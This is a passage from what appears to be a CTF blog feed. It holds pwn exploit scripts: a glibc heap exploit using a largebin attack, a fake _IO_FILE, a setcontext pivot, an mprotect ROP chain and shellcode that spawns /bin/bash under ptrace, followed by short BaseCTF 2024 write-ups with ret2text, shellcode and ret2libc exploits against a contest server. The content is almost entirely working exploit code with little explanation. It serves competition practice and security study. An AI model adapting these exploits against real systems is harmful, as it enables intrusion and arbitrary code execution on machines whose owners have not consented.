class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p = remote()</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;Content: &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x700</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = libc_addr - <span class="hljs-number">0x1f6cc0</span><br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = heap_addr - <span class="hljs-number">0x20a</span><br>log.success(<span class="hljs-string">&quot;heap_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x700</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x6f0</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x900</span>)<br>edit(<span class="hljs-number">0</span>,p64(libc_base + <span class="hljs-number">0x1f7170</span>)*<span class="hljs-number">2</span> + p64(heap_base+<span class="hljs-number">0x290</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] - <span class="hljs-number">0x20</span>))<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x900</span>)<br><br>fake_IO_FILE = heap_base + <span class="hljs-number">0xeb0</span><br>f = flat(&#123;<br>    <span class="hljs-number">0x0</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _flags</span><br>    <span class="hljs-number">0x8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_ptr</span><br>    <span class="hljs-number">0x10</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_endo</span><br>    <span class="hljs-number">0x18</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_read_base</span><br>    <span class="hljs-number">0x20</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_base</span><br>    <span class="hljs-number">0x28</span>: p64(<span class="hljs-number">1</span>), <span class="hljs-comment"># _IO_write_ptr</span><br>    <span class="hljs-number">0x30</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_write_end</span><br>    <span class="hljs-number">0x38</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_buf_base</span><br>    <span class="hljs-number">0x40</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_buf_end</span><br>    <span class="hljs-number">0x48</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_save_base</span><br>    <span class="hljs-number">0x50</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_backup_base</span><br>    <span class="hljs-number">0x58</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _IO_save_end</span><br>    <span class="hljs-number">0x60</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># markers</span><br>    <span class="hljs-number">0x68</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _chain</span><br>    <span class="hljs-number">0x70</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _fileno</span><br>    <span class="hljs-number">0x74</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _flags2</span><br>    <span class="hljs-number">0x78</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _old_offset</span><br>    <span class="hljs-number">0x80</span>: p16(<span class="hljs-number">0</span>), <span class="hljs-comment"># _cur_column</span><br>    <span class="hljs-number">0x82</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _vtable_offset</span><br>    <span class="hljs-number">0x83</span>: p8(<span class="hljs-number">0</span>), <span class="hljs-comment"># _shortbuf</span><br>    <span class="hljs-number">0x88</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _lock</span><br>    <span class="hljs-number">0x90</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _offset</span><br>    <span class="hljs-number">0x98</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _codecvt</span><br>    <span class="hljs-number">0xa0</span>: p64(fake_IO_FILE + <span class="hljs-number">0xe0</span>), <span class="hljs-comment"># _wide_data</span><br>    <span class="hljs-number">0xa8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _freeres_list</span><br>    <span class="hljs-number">0xb0</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># _freeres_buf</span><br>    <span class="hljs-number">0xb8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># __pad5</span><br>    <span class="hljs-number">0xc0</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _mode</span><br>    <span class="hljs-number">0xc4</span>: p32(<span class="hljs-number">0</span>), <span class="hljs-comment"># _unused2</span><br>    <span class="hljs-number">0xd8</span>: p64(libc_base + <span class="hljs-number">0x1f30a0</span>), <span class="hljs-comment">#_vtables</span><br>    &#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload = f.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0xe0</span><br>payload += p64(fake_IO_FILE + <span class="hljs-number">0x200</span>)<br>payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>payload += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x38</span><br>payload += p64(fake_IO_FILE+<span class="hljs-number">0x280</span>)<br>payload = payload.ljust(<span class="hljs-number">0x268</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(libc_base + <span class="hljs-number">0x160e56</span>) <span class="hljs-comment"># mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]</span><br>payload = payload.ljust(<span class="hljs-number">0x280</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>setcontext = flat(&#123;<br>    <span class="hljs-number">0x20</span>: p64(libc_base+<span class="hljs-number">0x041c3d</span>), <span class="hljs-comment">#  &lt;setcontext+61&gt;</span><br>    <span class="hljs-number">0xa0</span>: p64(fake_IO_FILE+<span class="hljs-number">0x400</span>), <span class="hljs-comment"># mov rsp,QWORD PTR [rdx+0xa0]</span><br>    <span class="hljs-number">0x80</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rbx,QWORD PTR [rdx+0x80]</span><br>    <span class="hljs-number">0x78</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rbp,QWORD PTR [rdx+0x78]</span><br>    <span class="hljs-number">0x48</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r12,QWORD PTR [rdx+0x48]</span><br>    <span class="hljs-number">0x50</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r13,QWORD PTR [rdx+0x50]</span><br>    <span class="hljs-number">0x58</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r14,QWORD PTR [rdx+0x58]</span><br>    <span class="hljs-number">0x60</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r15,QWORD PTR [rdx+0x60]</span><br>    <span class="hljs-number">0xa8</span>: p64(libc_base+<span class="hljs-number">0x233d1</span>), <span class="hljs-comment"># mov rcx,QWORD PTR [rdx+0xa8] ; push rcx # 0x00000000000233d1 : ret</span><br>    <span class="hljs-number">0x70</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rsi,QWORD PTR [rdx+0x70]</span><br>    <span class="hljs-number">0x68</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rdi,QWORD PTR [rdx+0x68]</span><br>    <span class="hljs-number">0x98</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rcx,QWORD PTR [rdx+0x98]</span><br>    <span class="hljs-number">0x28</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r8,QWORD PTR [rdx+0x28]</span><br>    <span class="hljs-number">0x30</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov r9,QWORD PTR [rdx+0x30]</span><br>    <span class="hljs-number">0x88</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># mov rdx,QWORD PTR [rdx+0x88]</span><br>    &#125;,filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += setcontext<br>payload = payload.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += p64(libc_base+<span class="hljs-number">0x23b65</span>) <span class="hljs-comment"># 0x0000000000023b65 : pop rdi ; ret</span><br>payload += p64(heap_base)<br>payload += p64(libc_base+<span class="hljs-number">0x251be</span>) <span class="hljs-comment"># 0x00000000000251be : pop rsi ; ret</span><br>payload += p64(<span class="hljs-number">0x10000</span>)<br>payload += p64(libc_base+<span class="hljs-number">0x166262</span>) <span class="hljs-comment"># 0x0000000000166262 : pop rdx ; ret</span><br>payload += p64(<span class="hljs-number">7</span>)<br>payload += p64(libc_base+libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>])<br>payload += p64(fake_IO_FILE+<span class="hljs-number">0x450</span>)<br>payload = payload.ljust(<span class="hljs-number">0x450</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>asmcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">_start:</span><br><span class="hljs-string">    /* fork() */</span><br><span class="hljs-string">    mov rax,57</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* if(pid&lt;0) exit(0) */</span><br><span class="hljs-string">    test rax,rax</span><br><span class="hljs-string">    js _exit</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* if(pid==0) */</span><br><span class="hljs-string">    cmp rax,0</span><br><span class="hljs-string">    je child_process</span><br><span class="hljs-string"></span><br><span class="hljs-string">parent_process:</span><br><span class="hljs-string">    /* save pid with r8 */</span><br><span class="hljs-string">    mov r8,rax</span><br><span class="hljs-string">    mov rsi,r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* ptrace(PTRACE_ATTACH,pid,0,0); */</span><br><span class="hljs-string">    mov rax,101</span><br><span class="hljs-string">    mov rdi,0x10</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    xor r10,r10</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">monitor_child:</span><br><span class="hljs-string">    /* wait4(pid,0,0,0); */</span><br><span class="hljs-string">    mov rdi,r8</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    xor r10,r10</span><br><span class="hljs-string">    mov rax,61</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_TRACESECCOMP) */</span><br><span class="hljs-string">    mov rdi,0x4200 /* PTRACE_SETOPTIONS */</span><br><span class="hljs-string">    mov rsi,r8</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov r10,0x00000080 /* PTRACE_O_TRACESECCOMP */</span><br><span class="hljs-string">    mov rax,101</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* ptrace(PTRACE_CONT,pid,0,0) */</span><br><span class="hljs-string">    mov rdi,0x7</span><br><span class="hljs-string">    mov rsi,r8</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    xor r10,r10</span><br><span class="hljs-string">    mov rax,101</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    jmp monitor_child</span><br><span class="hljs-string"></span><br><span class="hljs-string">child_process:</span><br><span class="hljs-string">    /* syscall(SYS_nanosleep,t,0) */</span><br><span class="hljs-string">    push 0</span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    mov rax,0x23</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* execve(&quot;/bin/bash&quot;,0,0) */</span><br><span class="hljs-string">    mov rax,0x0068 /* &quot;h\x00&quot; */</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax,0x7361622f6e69622f /* &quot;/bin/bas&quot; */</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov rsi,0</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rax,59</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    jmp child_process</span><br><span class="hljs-string"></span><br><span class="hljs-string">_exit:</span><br><span class="hljs-string">    /* exit(0) */</span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    xor rdi,rdi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = <span class="hljs-string">b&#x27;H\xc7\xc09\x00\x00\x00\x0f\x05H\x85\xc0\x0f\x88\xad\x00\x00\x00H\x83\xf8\x00tiI\x89\xc0L\x89\xc6H\xc7\xc0e\x00\x00\x00H\xc7\xc7\x10\x00\x00\x00H1\xd2M1\xd2\x0f\x05L\x89\xc7H1\xf6H1\xd2M1\xd2H\xc7\xc0=\x00\x00\x00\x0f\x05H\xc7\xc7\x00B\x00\x00L\x89\xc6H1\xd2I\xc7\xc2\x80\x00\x00\x00H\xc7\xc0e\x00\x00\x00\x0f\x05H\xc7\xc7\x07\x00\x00\x00L\x89\xc6H1\xd2M1\xd2H\xc7\xc0e\x00\x00\x00\x0f\x05\xeb\xb3j\x00j\x01H\x89\xe7H1\xf6H\xc7\xc0#\x00\x00\x00\x0f\x05H\xc7\xc0h\x00\x00\x00PH\xb8/bin/basPH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05\xeb\xc2H\xc7\xc0&lt;\x00\x00\x00H1\xff\x0f\x05&#x27;</span><br>payload += <span class="hljs-built_in">bytes</span>(shellcode)<br><br>edit(<span class="hljs-number">2</span>,payload[<span class="hljs-number">0x10</span>:])<br>quit()<br><br>p.interactive()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"># ls</span><br><span class="hljs-string">echo *</span><br><span class="hljs-string"></span><br><span class="hljs-string"># cat flag</span><br><span class="hljs-string">read -r f &lt; flag</span><br><span class="hljs-string">echo $&#123;f&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>basectf2024 wp</title>
      <link href="/2024/09/16/basectf2024-wp/"/>
      <url>/2024/09/16/basectf2024-wp/</url>
      
        <content type="html"><![CDATA[<p>BaseCTF 2024 全部的Pwn wp</p><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a>[Week1] Ret2text</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span>,<span class="hljs-number">34899</span>)<br>back = <span class="hljs-number">0x4011bb</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span>+p64(back)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a>[Week1] echo</h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo $(&lt;flag)<br></code></pre></td></tr></table></figure><h2 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h2><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br><span class="hljs-comment">#p = process(&quot;./shellcode_level0&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">47064</span>)<br><br>payload = asm(shellcraft.sh())<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week1-彻底失去她"><a href="#Week1-彻底失去她" class="headerlink" title="[Week1] 彻底失去她"></a>[Week1] 彻底失去她</h2><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>p = process(<span class="hljs-string">&quot;./彻底失去她&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;challenge.basectf.fun&quot;,23100)</span><br>elf = ELF(<span class="hljs-string">&quot;./彻底失去她&quot;</span>)<br><br>pop_rdi = <span class="hljs-number">0x401196</span><br>system_plt = <span class="hljs-number">0x401080</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x401218</span><br>ret = <span class="hljs-number">0x401264</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">18</span> + p64(pop_rdi) + p64(puts_got) + p64(ret) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;your name?\n&#x27;</span>)<br>puts_addr = u64(p.recv()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-comment">#libc_base = puts_addr - 0x80e50</span><br><span class="hljs-comment">#binsh = libc_base + 0x1d8678</span><br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">18</span> + p64(pop_rdi) + p64(binsh) + p64(system_plt) + p64(main)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h2><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td 